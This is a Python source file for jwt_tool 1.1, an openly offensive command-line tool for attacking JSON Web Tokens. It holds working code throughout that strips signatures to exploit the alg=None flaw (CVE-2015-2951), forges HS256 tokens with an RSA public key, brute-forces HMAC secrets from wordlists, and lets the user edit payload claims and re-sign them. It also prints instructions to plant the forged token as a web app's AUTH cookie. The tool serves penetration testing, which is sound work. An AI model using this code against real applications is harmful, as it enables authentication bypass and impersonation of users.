#! /usr/bin/python3

#
# JWT_Tool version 1.1 (08_06_2018)
# Written by ticarpi
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi
#

import sys
import hashlib
import hmac
import base64
import json
from collections import OrderedDict

def usage():
	print("Usage: $ python jwt_tool.py <JWT> (filename for dictionary or key file)\n")
	print("If you don't have a token, try this one:")
	print("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po")
	exit(1)

def checkSig(sig, contents):
	print("Type in the key to test")
	key = input("> ")
	if(testKey(key, sig, contents, headDict)):
		if len(key) > 25:
			print("[+] {0} ...(output trimmed) is the CORRECT key!".format(key[0:25]))
		else:
			print("[+] {0} is the CORRECT key!".format(key))
	else:
		if len(key) > 25:
				print("[-] {0} ...(output trimmed) is not the correct key".format(key[0:25]))
		else:
			print("[-] {0} is not the correct key".format(key))

def checkSigKid(sig, contents,key_file):
	#With \n
	withN = testKey(key_file, sig, contents, headDict)
	#Without \n
	withoutN = testKey(key_file.strip('\n'), sig, contents, headDict)
	if(withN):
		if len(key_file) > 25:
			print("[+] {0} ...(output trimmed) is the CORRECT key!".format(key_file[0:25]))
		else:
			print("[+] {0} is the CORRECT key!".format(key_file))
	elif(withoutN):
		if len(key_file) > 25:
			print(r"[+] {0} ...(output trimmed) is the CORRECT key! (WITH \N STRIPPED)".format(key_file[0:25]))
		else:
			print(r"[+] {0} is the CORRECT key! (WITH \N STRIPPED)".format(key_file.strip('\n')))
	else:
		if len(key_file) > 25:
				print("[-] {0} ...(output trimmed) is not the correct key".format(key_file[0:25]))
		else:
			print("[-] {0} is not the correct key".format(key_file.strip('\n')))

def crackSig(sig, contents,num_lines,key_list):
	found = False
	print("[+] Testing {0} passwords".format(num_lines))
	for i in key_list:
		if(testKey(i, sig, contents, headDict)):
			found = True
			print("[+] {0} is the CORRECT key!".format(i))
	if(not found):
		print("[-] The key was not found")
		

def testKey(key, sig, contents, headDict):
	confirmed = False
	#Must convert in bytes for the digest function
	key_b = key.encode('utf-8')
	contents_b = contents.encode('utf-8')
	if headDict["alg"] == "HS256":
		testHash = hmac.new(key_b,contents_b,hashlib.sha256).digest()
	elif headDict["alg"] == "HS384":
		testHash = hmac.new(key_b,contents_b,hashlib.sha384).digest()
	elif headDict["alg"] == "HS512":
		testHash = hmac.new(key_b,contents_b,hashlib.sha512).digest()
	else:
		print("Algorithm is not HMAC-SHA - cannot test with this tool.")
		exit(1)
	testSig = (base64.urlsafe_b64encode(testHash).decode('utf-8')).strip("=")
	if testSig == sig:
		confirmed = True
	return confirmed

def buildHead(alg, headDict):
	newHead = headDict
	newHead["alg"] = alg
	jsonDump = json.dumps(newHead,separators=(",",":"))
	newHead = base64.urlsafe_b64encode(jsonDump.encode('utf-8'))
	newHead = (newHead.decode('utf-8')).strip("=")
	return newHead

def signToken(headDict, paylDict, key, keyLength):
	newHead = headDict
	newHead["alg"] = "HS"+str(keyLength)
	#Prepare content and head for signing
	jsonContent = json.dumps(paylDict,separators=(",",":"))
	jsonHead = json.dumps(newHead,separators=(",",":"))
	bs64Content = (base64.urlsafe_b64encode(jsonContent.encode('utf-8'))).decode('utf-8').strip("=")
	bs64Head = (base64.urlsafe_b64encode(jsonHead.encode('utf-8'))).decode('utf-8').strip("=")
	newContents = bs64Head+"."+bs64Content
	#Must convert in bytes for the digest function
	newContents_b = newContents.encode('utf-8')
	key_b = key.encode('utf-8')
	if keyLength == 384:
		newSig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha384).digest())
		badSig = base64.b64encode(hmac.new(key_b,newContents_b,hashlib.sha384).digest())
	elif keyLength == 512:
		newSig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha512).digest())
		badSig = base64.b64encode(hmac.new(key_b,newContents_b,hashlib.sha512).digest())
	else:
		newSig = base64.urlsafe_b64encode(hmac.new(key_b,newContents_b,hashlib.sha256).digest())
		badSig = base64.b64encode(hmac.new(key_b,newContents_b,hashlib.sha256).digest())
	return newSig.decode('utf-8').strip("="), badSig.decode('utf-8').strip("="), newContents

def checkCVE(headDict, tok2):
	print("\nGenerating alg-stripped token...")
	alg = "None"
	newHead = buildHead(alg, headDict)
	CVEToken = newHead+"."+tok2+"."
	print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
	print("\n{0}\n".format(CVEToken))

def checkPubKey(headDict, tok2):
	print("\nPlease enter the Public Key filename:")
	pubKey = input("> ")
	try:
		with open(pubKey) as filekey:
			key = filekey.read()
			print("File loaded: {0}".format(pubKey))
			newHead = buildHead("HS256",headDict)
			newTok = newHead+"."+tok2
			newHmac = hmac.new(key.encode('utf-8'),newTok.encode('utf-8'),hashlib.sha256).digest()
			newSig = base64.urlsafe_b64encode(newHmac)
			newSig = (newSig.decode("utf-8")).strip("=")
			print("\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)")
			print("\n{0}.{1}".format(newTok, newSig))
	except FileNotFoundError:
		print("[-] File {0} doesn't exists".format(pubKey))
	

def tamperToken(paylDict, headDict):
	print("\nToken header values:")
	while True:
		i = 0
		headList = [0]
		for pair in headDict:
			menuNum = i+1
			print("[{0}] {1} = {2}".format(menuNum, pair, headDict[pair]))
			headList.append(pair)
			i += 1
		print("["+str(i+1)+"] *ADD A VALUE*")
		print("[0] Continue to next step")
		selection = 0
		print("\nPlease select a field number:\n(0 or ENTER to Continue)")
		try:
			selection = int(input("> "))
		except:
			selection = 0
		if selection<len(headList) and selection>0:
			print("\nCurrent value of {0} is: {1}".format(headList[selection],headDict[headList[selection]]))
			print("Please enter new value and hit ENTER")
			newVal = input("> ")
			headDict[headList[selection]] = newVal
		elif selection == i+1:
			print("Please enter new Key and hit ENTER")
			newPair = input("> ")
			print("Please enter a new value for {0} and hit ENTER".format(newPair))
			newVal = input("> ")
			headList.append(newPair)
			headDict[headList[selection]] = newVal
		elif selection == 0:
			break
		else:
			print("[-] Option not valid \n")
	print("\nToken payload values:")
	while True:
		i = 0
		paylList = [0]
		for pair in paylDict:
			menuNum = i+1
			print("[{0}] {1} = {2}".format(menuNum, pair, paylDict[pair]))
			paylList.append(pair)
			i += 1
		print("[0] Continue to next step")
		selection = 0
		print("\nPlease select a field number:\n(0 or ENTER to Continue)")
		try:
			selection = int(input("> "))
		except:
			selection = 0
		if selection<len(paylList) and selection>0:
			print("\nCurrent value of {0} is: {1}".format(paylList[selection], paylDict[paylList[selection]]))
			print("Please enter new value and hit ENTER")
			newVal = input("> ")
			paylDict[paylList[selection]] = newVal
		elif selection == 0:
			break
		else:
			print("[-] Option not valid \n")
	print("\nToken Signing:")
	print("[1] Sign token with known key")
	print("[2] Strip signature from token vulnerable to CVE-2015-2951")
	print("[3] Sign with Public Key bypass vulnerability")
	print("[4] Sign token with key file")
	print("\nPlease select an option from above (1-4):")
	try:
		selection = int(input("> "))
	except:
		selection = 0
	if selection == 1:
		print("\nPlease enter the known key:")
		key = input("> ")
		print("\nPlease enter the keylength:")
		print("[1] HMAC-SHA256")
		print("[2] HMAC-SHA384")
		print("[3] HMAC-SHA512")
		try:
			selLength = int(input("> "))
		except:
			print("[-] Option not valid")
			exit(1)
		if selLength == 2:
			keyLength = 384	
		elif selLength == 3:
			keyLength = 512
		else:
			keyLength = 256
		newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
		print("\nYour new forged token:")
		print("[+] URL safe: {0}.{1}".format(newContents,newSig))
		print("[+] Standard: {0}.{1}\n".format(newContents,badSig))
		exit(1)
	elif selection == 2:
		print("\nStripped Signature")
		jsonDump = json.dumps(paylDict,separators=(",",":"))
		tok2 = (base64.urlsafe_b64encode(jsonDump.encode('utf-8'))).decode('utf-8').strip("=")
		checkCVE(headDict, tok2)
		exit(1)
	elif selection == 3:
		jsonDump = json.dumps(paylDict,separators=(",",":"))
		tok2 = (base64.urlsafe_b64encode(jsonDump.encode('utf-8'))).decode('utf-8').strip("=")
		checkPubKey(headDict, tok2)
		exit(1)
	if selection == 4:
		print("\nPlease enter the key filename:")
		file_name= input(">")
		try:
			with open(file_name) as f:
				key = f.read()
				print("File loaded: {0}".format(file_name))
		except FileNotFoundError:
			print("[-] File {0} doesn't exists".format(file_name))
			exit(1)
			
		print("\nPlease enter the keylength:")
		print("[1] HMAC-SHA256")
		print("[2] HMAC-SHA384")
		print("[3] HMAC-SHA512")
		try:
			selLength = int(input("> "))
		except:
			print("[-] Option not valid")
		if selLength == 2:
			keyLength = 384	
		elif selLength == 3:
			keyLength = 512
		else:
			keyLength = 256
		newSig, badSig, newContents = signToken(headDict, paylDict, key, keyLength)
		print("\nYour new forged token:")
		print("[+] URL safe: {0}.{1}".format(newContents,newSig))
		print("[+] Standard: {0}.{1}\n".format(newContents,badSig))
		exit(1)
	else:
		print("[-] Option not valid")
		exit(1)


if __name__ == '__main__':
# Print logo
	print("\n,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.")
	print("----''----''----''----''----''----''----''----''----''----'")
	print("     ,--.,--.   ,--.,--------.,--------.             ,--.")
	print("     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |")
	print(",--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |")
	print("|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |")
	print(" `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'")
	print(",----.,----.,----.,----.,----.,----.,----.,----.,----.,----.")
	print("'----''----''----''----''----''----''----''----''----''----'")

# Only use Python3
	if sys.version_info[0] < 3:
		print("[-] Must be using Python 3")
		exit(1)

# Print usage + check token validity
	if len(sys.argv) < 2:
		usage()

# Temporary variables
	jwt = sys.argv[1]
	key = ""
	""" if len(sys.argv) == 3:
		keyList = sys.argv[2]
		numLines = sum(1 for line in open(keyList) if line.rstrip())
		with open(keyList, "r") as f:
		    keyLst = f.readlines()
		keyLst = [x.strip() for x in keyLst]
	else:
		keyList = "" """

# Rejig token
	try:
		tok1, tok2, sig = jwt.split(".",3)
		sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4)))
		sig = (sig.decode('utf-8')).strip('=')
		contents = tok1+"."+tok2
		head = base64.b64decode(tok1 + "=" * (-len(tok1) % 4))
		payl = base64.b64decode(tok2 + "=" * (-len(tok2) % 4))
		headDict = json.loads(head, object_pairs_hook=OrderedDict)
		paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
	except:
		print("Oh noes! Invalid token")
		exit(1)

# Main menu
	print("\nToken header values:")
	for i in headDict:
  		print("[+] "+i+" = "+str(headDict[i]))
	print("\nToken payload values:")
	for i in paylDict:
  		print("[+] "+i+" = "+str(paylDict[i]))
	print("\n######################################################")
	print("# Options:                                           #")
	print("# 1: Check CVE-2015-2951 - alg=None vulnerability    #")
	print("# 2: Check for Public Key bypass in RSA mode         #")
	print("# 3: Check signature against a key                   #")
	print("# 4: Check signature against a key file (\"kid\")      #")
	print("# 5: Crack signature with supplied dictionary file   #")
	print("# 6: Tamper with payload data (key required to sign) #")
	print("# 0: Quit                                            #")
	print("######################################################")
	print("\nPlease make a selection (1-6)")
	try:
		selection = int(input("> "))
	except:
		selection = 0
	if selection == 1:
		checkCVE(headDict, tok2)
	elif selection == 2:
		checkPubKey(headDict, tok2)
	elif selection == 3:
		checkSig(sig, contents)
	elif selection == 4:
		print("\nPlease enter the key filename:")
		file_name= input(">")
		try:
			with open(file_name) as f:
				print("File loaded: {0}".format(file_name))
				checkSigKid(sig, contents,f.read())
		except FileNotFoundError as e:
			print("[-] File {0} doesn't exists".format(file_name))
	elif selection == 5:
		print("\nPlease enter the dictionary filename:")
		file_name= input("> ")
		try:
			with open(file_name) as f:
				print("File loaded: {0}".format(file_name))
				num_lines = sum(1 for line in open(file_name) if line.rstrip())
				with open(file_name, "r") as f:
					lines = f.readlines()
					key_list = [x.strip() for x in lines]
					crackSig(sig, contents,num_lines,key_list)
		except FileNotFoundError as e:
			print("[-] File {0} doesn't exists".format(file_name))
	elif selection == 6:
		tamperToken(paylDict, headDict)
	else:
		print("[-] Option not valid")
		exit(1)
	exit(1)

	
